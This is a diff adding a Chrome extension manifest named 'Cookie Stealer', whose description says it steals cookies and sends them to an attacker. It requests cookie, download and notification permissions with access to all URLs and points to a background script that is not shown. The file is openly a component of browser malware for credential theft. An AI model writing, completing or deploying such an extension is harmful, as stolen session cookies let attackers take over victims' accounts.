@@ -1,0 +1,18 @@
+{
+    "manifest_version": 3,
+    "name": "Cookie Stealer",
+    "version": "1.0",
+    "description": "This extension steals cookies and sends them to an attacker.",
+    "background": {
+        "service_worker": "background.js"
+    },
+    "permissions": [
+        "cookies",
+        "downloads",
+        "notifications",
+        "activeTab"
+    ],
+    "host_permissions": [
+        "<all_urls>"
+    ]
+}
